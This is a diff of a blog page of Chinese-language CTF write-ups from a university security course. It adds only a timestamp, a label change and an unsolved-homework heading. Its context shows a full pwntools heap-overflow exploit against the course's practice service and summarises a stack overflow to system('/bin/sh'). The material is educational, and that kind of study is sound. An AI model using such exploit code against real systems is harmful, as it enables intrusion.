@@ -14,7 +14,7 @@
 <meta property="og:url" content="http://w181496.twbbs.org/2017/10/15/EDU-CTF-計算機安全/index.html">
 <meta property="og:site_name" content="Kaibro&#39;s blog">
 <meta property="og:description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋return address跳過去即可get she">
-<meta property="og:updated_time" content="2017-11-17T06:08:17.000Z">
+<meta property="og:updated_time" content="2017-11-17T06:15:15.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="EDU-CTF 計算機安全">
 <meta name="twitter:description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋return address跳過去即可get she">
@@ -73,7 +73,7 @@
 						<li>Tags</li>
 						
 						
-						<li>About</li>
+						<li>A propos</li>
 						
 					</ul>
 				</div>
@@ -319,6 +319,7 @@
 <p>最後exit，就會噴FLAG惹</p>
 <p>exploit:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">'csie.ctf.tw'</span>, <span class="number">10138</span>)</div><div class="line"><span class="comment">#r = remote('localhost', 10138)</span></div><div class="line"></div><div class="line">target = <span class="number">0x400d49</span></div><div class="line">big = <span class="number">0xffffffffffffffff</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_item</span><span class="params">(length, content)</span>:</span></div><div class="line">r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(length))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_item</span><span class="params">(index, length, content)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"3"</span>)</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(index))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(length))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(content)</div><div class="line"></div><div class="line">add_item(<span class="number">64</span>, <span class="string">"abc"</span>)</div><div class="line">edit_item(<span class="number">0</span>, <span class="number">80</span>, <span class="string">"A"</span>*<span class="number">64</span> + p64(<span class="number">0</span>) + p64(big))</div><div class="line"></div><div class="line"><span class="comment"># item size, box size, sizeof(header)</span></div><div class="line"><span class="comment"># -(64 + 16) - (16 + 16) - 16</span></div><div class="line">add_item(<span class="number">-128</span>, <span class="string">"kai"</span>)  </div><div class="line">add_item(<span class="number">32</span>, p64(target) * <span class="number">2</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<h2 id="5Bhw4_5D_profile_manager"><a href="#5Bhw4_5D_profile_manager" class="headerlink" title="[hw4] profile_manager"></a>[hw4] profile_manager</h2><p>我廢，還沒解出來QQ<br>最近專心搞Web，有空再研究</p>
 <p>[未完待續…]</p>
 
       
